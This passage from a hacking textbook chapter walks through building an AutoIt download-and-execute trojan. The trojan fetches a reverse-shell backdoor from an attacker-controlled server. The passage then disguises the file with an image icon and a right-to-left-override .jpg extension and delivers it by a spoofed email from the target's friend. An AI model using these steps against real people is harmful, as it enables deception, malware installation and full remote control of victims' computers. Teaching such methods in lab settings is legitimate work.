<p>The next file that we wanted to be downloaded and executed is our backdoor. We are going to insert a comma and then we are going to put in a direct URL for our backdoor. For our example, that URL is stored at <kbd>http://10.20.14.213/evil-files/rev_https_8080.exe</kbd>. If we just paste that URL, we can access the file and download it directly. This is very, very important; the script will not work if we don't use direct URLs. As we can see, the script is very simple, all we have to do is insert the URL for the first file and then we put in a comma, which is important again. We have to separate the URLs by a comma, and then we put in the URL for the second file. As mentioned earlier, if we want to download more files, or download more backdoors or more evil files, all we have to do is insert another comma and put in the next URL. The <kbd>Local $urls</kbd> parameter should now contain the following parameters:</p>
<pre class="CDPAlignLeft CDPAlign">Local $urls = "https://res.cloudinary.com/goodsearch/image/upload/v1508929095/hi_resolution_merchant_logos/packt-publishing_coupons.png, http://10.20.14.213/evil-files/rev_https_8080.exe"</pre>
<p>Now, all we have to do is compile the script to an executable, and we are going to learn how to do that in the next section.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Changing the icon and compiling the payload</h1>
                </header>
            
            <article>
                
<p>In the previous section, we worked on our script. In this section, we are going to learn how to compile it to an executable and how to change its icon. The script is written in a scripting language called AutoIt. AutoIt doesn't come preinstalled in Kali, but it gets installed when we install Veil. Since we're using a Veil backdoor, there's no way we could have gotten to this point without having installed Veil. That's why we are not going to cover how to install AutoIt; we can just download it and run the installer using Wine. So, AutoIt should be already installed for us by now, and all we have to do is rename the <kbd>.txt</kbd> file and change the extension from <kbd>.txt</kbd> to <kbd>.au3</kbd>. Then, search for the program in Kali by typing <kbd>compile</kbd> and we will see that we have the application that will compile AutoIt scripts for us, as shown in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1675 image-border" src="assets/395ed547-22a8-4d92-bf6b-e0230866e930.png" style="width:7.50em;height:7.58em;"/></p>
<p class="mce-root"/>
<p>The first thing it asks us for is the source AutoIt script, and that's the file that we made. So we are going to click on <span class="packt_screen">Browse</span>, navigate to the <kbd>.au3</kbd> file, and click on <span class="packt_screen">Open</span>. We can also set where it's going to be stored, but we're just going to keep storing it in <span class="packt_screen">Downloads</span>, as shown in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1676 image-border" src="assets/b1200156-93a0-4eb3-80ed-62524522dd1f.png" style="width:39.17em;height:27.58em;"/></p>
<p>As we can see, we can change the icon and use a custom icon by uploading a <kbd>.ico</kbd> file under <span class="packt_screen">Options</span>. To do this, we'll have to first download an icon that represents our file.</p>
<p>If our file was a PDF file, then just visit the <span>Icon Archive </span>website (<a href="http://www.iconarchive.com" target="_blank">http://www.iconarchive.com</a>), and search for and download a PDF icon from the site. However, in our example, we are trying to use an image as the file that the person sees. Windows usually shows a preview of the image; it doesn't really show a specific icon for images. So we want to convert the image to an icon, and to do that, we go to the RealWorld Designer site (<a href="http://www.rw-designer.com/image-to-icon" target="_blank">http://www.rw-designer.com/image-to-icon</a>). Download the image that we want to make an icon of, upload it to the site by clicking <span class="packt_screen">Browse</span>, convert it from the site, and save it in the <kbd>Downloads</kbd> directory. The following are the details required for <span class="packt_screen">Online Icon Creator</span>:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/421db235-27f6-46ba-b465-e021ba50c889.png" style="width:30.25em;height:22.92em;"/></p>
<p>Now, go back to the compiler and set the options—the icon—(we are going to click on <span class="packt_screen">Browse</span>), and select the icon that we just downloaded:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/5bf34b7e-98f1-4619-948b-254587a73f1d.png" style="width:38.33em;height:26.83em;"/></p>
<p>All the options are set. All we have to do is click on <span class="packt_screen">Convert</span>, and the file will be generated:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/0cb06aa4-7d25-43bc-8bb5-287f4c53f659.png" style="width:41.67em;height:29.33em;"/></p>
<p>Click on <span class="packt_screen">OK</span>, and close everything. Now we have the executable in <kbd>.exe</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1682 image-border" src="assets/e091bb5d-a53f-4f5d-88bd-55a8969cd662.png" style="width:26.25em;height:12.08em;"/></p>
<p>So, when we are sending it to the target, we want to be sending <kbd>.exe</kbd>, the executable, as we can see in the preceding screenshot. Now, copy the executable into the web server at the <kbd>/var/www/html/evil-files</kbd> directory.</p>
<p class="mce-root"/>
<p>Before downloading the file to the target computer, we want to listen for incoming connections from Metasploit. We learned how to do that in <a href="e8d786b6-f25c-4005-932d-42b7c2948972.xhtml" target="_blank">Chapter 10</a>, <em>Gaining Access to Computer Devices</em>. For now, we are only going to run <kbd>exploit</kbd> to wait for incoming connections. Now that everything is ready, go to the Windows machine and download the file. The file is going to be available at <kbd>http://10.0.2.15/evil-files/autoit-download-and-execute.exe</kbd>. Visit the link and save the file:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1685 image-border" src="assets/b9696310-49e0-42dc-a884-c11d6f10821a.png" style="width:31.92em;height:18.25em;"/></p>
<p>As we can see in the following screenshot, we have a file that has an icon, which has a preview of the image, so it's very representative. If we double-click this file and run it, we see that we get an image that corresponds to the icon:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1686 image-border" src="assets/136b42f0-aea4-4785-803e-5c9497f87df8.png" style="width:32.42em;height:20.08em;"/></p>
<p class="mce-root"/>
<p>If we go to the Kali machine, we will see that we encountered a Meterpreter session and, basically, now we've hacked into the target computer and can do anything that we want to the target. So, just to confirm, we are going to run the <kbd>sysinfo</kbd> command and, as we can see in the following screenshot, now we're inside the target computer, and we have full access to it:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/8cc80e23-77de-4341-825d-9595d17ffd9f.png" style="width:23.50em;height:12.25em;"/></p>
<p>We managed to do this with a file that has an icon of an image and actually displayed an image pertaining to the target person. As mentioned previously, this method can be used to combine our backdoor with an image, with a PDF, with a song, or anything that the target person is interested in.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Changing extensions</h1>
                </header>
            
            <article>
                
<p>If we look at the backdoor, or the Trojan that we've generated so far, all it has is an icon that represents a file that the target person is interested in. When it's executed, it shows a normal file. And, at the same time, it's going to execute our code in the background, which will allow us to hack the target computer, or do whatever we want. The only problem with this file is that if we look at the end of the file, we can see that it has a <kbd>.exe</kbd> extension. In most cases, the target probably won't see the <kbd>.exe</kbd> extension because Windows is configured to hide it, but if it's not hiding it, then it's obvious that this file is an executable because it ends with a <kbd>.exe</kbd> extension. In this section, we are going to focus on how to spoof our Trojan and change it to something that corresponds to the file. If we're trying to make our backdoor look like a PDF, we can make it look like it has a <kbd>.pdf</kbd> extension; if we're trying to make the file look like an image, we want to make its extension look like a <kbd>.jpg</kbd>, a <kbd>.png</kbd>, or an extension that represents the image.</p>
<p>In our case, we're trying to make it look like an image, which means it should have a <kbd>.jpg</kbd> extension. To do that, we're going to use a right-to-left override character. We are just going to copy and paste it into our text editor so that when we are modifying things, it's clear to us what we are doing:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1687 image-border" src="assets/c4689cda-6f7e-4aeb-b443-ddc3c3195be1.png" style="width:7.42em;height:6.08em;"/></p>
<p>In the preceding screenshot, we can see the new filename that we want to use, which is <kbd>Image</kbd>, and this is going to have a <kbd>.exe</kbd> <span>extension</span>. Now, instead of <kbd>.exe</kbd>, we actually want to have <kbd>.jpg</kbd>, but that's not possible because if we do that, the file is not going to be an executable. To change the extension, we are going to try to get the text to be read from right to left, using a right-to-left override character. Because the text is going to be read from right to left, we're going to type <kbd>gpj</kbd> after the <kbd>Image</kbd> filename, but we're going to spell it from right to left. Again, this is just the extension that we want to use, but we're spelling it from right to left, so we're spelling it gpj instead of <kbd>jpg</kbd>.</p>
<p>Now, we want to put in a right-to-left character. When we put that character in the text, anything that comes in after that character will be read from right to left, so all this is going to be flipped and the <kbd>Imagegpj.exe</kbd> filename is going to be called <kbd>Imageexe</kbd>, and <kbd>gpj</kbd> is going to be read from right to left, so it's going to be <kbd>.jpg</kbd>. Let's perform it and we'll see what we mean by reading from right to left. To get that character, we're going to search for <kbd>Characters</kbd> in Kali and open the program:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1688 image-border" src="assets/f4aee29f-1092-40ab-80b3-b40480a8f3ce.png" style="width:24.92em;height:14.25em;"/></p>
<p class="mce-root"/>
<p>Click on the <span class="packt_screen">Search</span> icon and search for the right-to-left override:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1689 image-border" src="assets/c450333a-fb11-4d82-a598-bbd2d3fe9e91.png" style="width:39.75em;height:34.33em;"/></p>
<p class="mce-root"/>
<p><span>If we click on it, we will see a button that will allow us to copy that character:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1690 image-border" src="assets/b2f081e6-ee6e-4527-b325-f8bbd9e0d389.png" style="width:20.17em;height:20.08em;"/></p>
<p><span>Click on <span class="packt_screen">Copy Character</span> and that will copy the character for this example. Now, go back to editor and paste the copied character in front of <kbd>gpj.exe</kbd>:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1691 image-border" src="assets/f28e3d56-1d82-4c41-b270-cb351be5db0f.png" style="width:13.33em;height:4.33em;"/></p>
<p><span>As seen in the preceding screenshot, if we paste it, everything is being read from right to left and the filename is going to be called <kbd>Imageexe.jpg</kbd>. If we are using this as a book or as something else, we want to think of a name that ends with "ex". Anything that ends with "ex" will be a good name to use. So, we have our name now and we are just going to copy the new name from the text editor, and then we are going to rename the backdoor file and we will have a file called <kbd>Imageexe.jpg</kbd>, as shown in the following screenshot:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1692 image-border" src="assets/78f49aea-2770-486c-ac6d-e87b2f05c383.png" style="width:25.25em;height:8.00em;"/></p>
<p class="mce-root"/>
<p>Now, we can send the new file to the target, but we don't want to send it like this because some recent browsers are removing the right-to-left override when downloading the file, so what we are going to do is compress the file to <kbd>Imagejpg.zip</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1694 image-border" src="assets/978eaa2d-db4d-4a5a-85cc-565106127bad.png" style="width:26.08em;height:5.58em;"/></p>
<p>This way, when the file is downloaded by the browser, it will not replace the right-to-left override. Copy the content, paste it into the <kbd>evil-files</kbd> folder, and then we're going to download it from the Windows machine.</p>
<p>Now, we will listen for incoming connections (we have already done this, so if a refresher is needed, go back to <a href="e8d786b6-f25c-4005-932d-42b7c2948972.xhtml" target="_blank">Chapter 10</a>, <em>Gaining Access to Computer Devices</em>). Go to the Windows machine and download the file, which is located at <kbd>http://10.0.2.15/Imagejpg.zip</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1695 image-border" src="assets/b6af4061-3a6b-4866-907a-3eb251da6cdc.png" style="width:30.75em;height:26.17em;"/></p>
<p>Uncompress the downloaded file and, as we can see in the following screenshot, the file has a <kbd>.jpg</kbd> extension. It has an image icon and, if we double-click it, it will actually show us an image, but, at the same time, it's going to execute our backdoor in the background:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1696 image-border" src="assets/94eaea37-8136-44d7-8610-7d3b54513cb3.png" style="width:43.17em;height:13.17em;"/></p>
<p>So, if we go to the Kali machine, we will get a session from that computer, and, just to confirm this, we are going to run <kbd>sysinfo</kbd>. As we can see in the following screenshot, we are now inside that computer and we have full control over it:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1697 image-border" src="assets/e51ee35f-b074-4bae-8ae0-2a8df9095655.png" style="width:25.25em;height:13.17em;"/></p>
<p>We managed to do this using a file that looks and functions exactly like an image. This method can be used to make the file look like any other file type, so we don't have to make it look like an image; we can use this method to make it look like a PDF, a song, a video, or anything that we want. We can use the download-and-execute payload to combine the backdoor with any file, and then use this method to change the file extension to any file extension we want.</p>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Client-side attacks – TDM email spoofing</h1>
                </header>
            
            <article>
                
<p>We've seen how we can backdoor any file and make it look like a document, a song, a program, or an image. Our example was an image, but we can do it on any file. So, we should be gathering information using Maltego and then target the person based on the information gathered. For example, we can pretend to be tech support and ask the target person to install an update and combine our backdoor within an executable, or we can just pretend to be a friend or a colleague and ask the target person to run a certain document or a PDF; the possibilities are endless. In this example, we are going to pretend to be a friend and we are going to ask the target to open a picture of an image, telling them that we are thinking of buying that car. We are going to use the backdoor that we created in the <em>Changing extensions</em> section and use an image of a car instead<span>, and then we are going to contact our target asking them what they think of this car.</span></p>
<p>Let's go back to the graph that we created with Maltego and look at the screenshot from the <em>SE summary</em> section where the information is displayed. By browsing his Twitter, we managed to see that our target has a friend called Mohammed, and when we went on his email, we saw that the same person has an email address of <kbd>m.askar@isecur1ty.org</kbd>. So, this person came up twice, on the email address and on Twitter, so our target probably has a good relationship with this person and there's a high chance that Zaid will open something from them. So we can contact our target on Twitter pretending to be someone who knows Mohammed, or we can contact them by email. Contacting them by email has a huge advantage because we can pretend to be <kbd>m.askar@isecur1ty.org</kbd>, and we can send an email that would look exactly as if it came from Mohammed Askar:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/32fdb89d-3325-4ba5-a877-9174dc1e67b2.png"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref">Image that is downloaded from the attachment sent through the mail.</div>
<p class="mce-root"/>
<p>So, that's what we're doing. Let's go to Google and search for a mailer. We can host our own mailers on our own web service or we can use Google to look for mailers. I've tried a few of them and could send anonymous emails with the most secure mailer. So we are going to use <a href="https://anonymousemail.me/" target="_blank">https://anonymousemail.me/</a>; it asks us to put in our name, since we are pretending to be Mohammed, so we are going to put it as <kbd>mohammed</kbd>, and then it will ask us for the email, that is, where the email will be coming from, and we're going to set it as <kbd>m.askar@isecur1ty.org</kbd>, so the message we're going to send will look as if it's coming from this email. We are just going to use a test email that we set up. We can also set an option for where the message will go if the person replies to that message. We are going to leave that empty, set the subject to <kbd>Check out this car</kbd>, and then set an informal message, because we think that this person is a friend. The following screenshot shows the preceding steps:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1869 image-border" src="assets/f6447adb-1b68-495a-b017-c0b9eb981132.png" style="width:45.08em;height:29.50em;"/></p>
<p class="mce-root"/>
<p class="mce-root"/>
<p>Now we can send an attachment with the email, but, most of the time, attachments don't always get sent successfully, so it's recommend to upload the backdoor on Dropbox or Google Drive and then send a link to the target. Always shorten the shared URL to make it look shorter and more acceptable. We can do that by Googling a link-shortener, so we're going to use bitly.com, a very famous service. All we are doing now is social engineering, just making the message look more acceptable. Copy the shortened link and send it in the message. And that's it, we are done, so send the message:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/f6be2d38-f08b-41a2-9dc0-c0717175fee7.png" style="width:58.83em;height:31.25em;"/></p>
<p>We have already logged into our test account and we will see that we got an email from a person called Mohammed. If we hover over it, we will see that it's coming from <span class="packt_screen">Mohammad Askar</span> from <kbd>m.askar@isecur1ty.org</kbd>, and can even see the picture of the guy, even though we didn't send the email from his email and we don't know his password. We actually just sent it from an anonymous mailer, but it looks exactly as if it came from him, and he's our friend, so it's highly likely that we will open his message:</p>
<p class="CDPAlignCenter CDPAlign packt_figref"><img src="assets/04058657-47de-444c-bb87-e8691cc06704.png"/></p>
<p class="mce-root"/>
<div class="CDPAlignCenter CDPAlign packt_figref">Spoofed email received </div>
<p>The message is just telling us that he is going buy a car, and is asking us to have a look at it and what we think of it. So we will probably click on the link. And now the picture has been downloaded, so if we just open the picture, called <kbd>gtrexe.jpg</kbd>, it actually has the icon for the car, hence the extension is still an extension for an image:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1871 image-border" src="assets/480604f7-83f8-4bad-a055-fb01ddb0656c.png" style="width:25.42em;height:27.83em;"/></p>
<div class="CDPAlignCenter CDPAlign packt_figref">Backdoor with a .jpg extension</div>
<p>If the target runs the file, we will have a Windows command shell where we can do anything we want on the target's system.</p>
<p class="mce-root"/>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p>In this chapter, we studied how we can perform client-side attacks using social engineering. We used social engineering techniques to again access to the victim's machine by making him actively participate in actions that help us to gain control over his system. We studied an important tool, Maltego, which is very powerful and helped us to collect important information about the target's social life; we could stalk his all social media accounts. Using this information, we planned ways whereby we could attack the target. We even learned how to create customized icons for files to act as backdoors for us to attack his system.</p>
<p>Employing information from Maltego, we used the email ID of a friend of the target to send a message that contained a backdoor that would activate once the victim opened the file. </p>
<p>In the next chapter, we will be studying the BeEF browser tool to attack the target system and detect Trojans.</p>


            </article>

            
        </section>
    </body></html>